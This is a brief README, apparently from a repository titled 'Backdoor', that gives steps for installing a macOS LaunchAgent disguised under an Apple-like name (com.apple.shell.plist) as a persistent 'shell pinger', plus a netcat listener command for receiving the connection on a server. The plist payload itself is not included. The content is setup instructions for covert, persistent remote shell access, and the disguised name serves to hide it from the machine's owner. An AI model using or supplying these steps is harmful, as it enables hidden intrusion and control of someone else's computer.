# Backdoor

## Set Up Long Running Shell Pinger

- Change the username in `com.apple.shell.plist`
- Change the dir_of_shell in `com.apple.shell.plist`
- Add `com.apple.shell.plist` to Launch Agents
  - Run `cp com.apple.shell.plist ~/Library/LaunchAgents`
- Start the Agent
  - Run `launchctl load ~/Library/LaunchAgents/com.apple.shell.plist`
- To remove Agent
  - Run `launchctl unload ~/Library/LaunchAgents/com.apple.shell.plist`

## Listening From Server

`nc -l 3001`
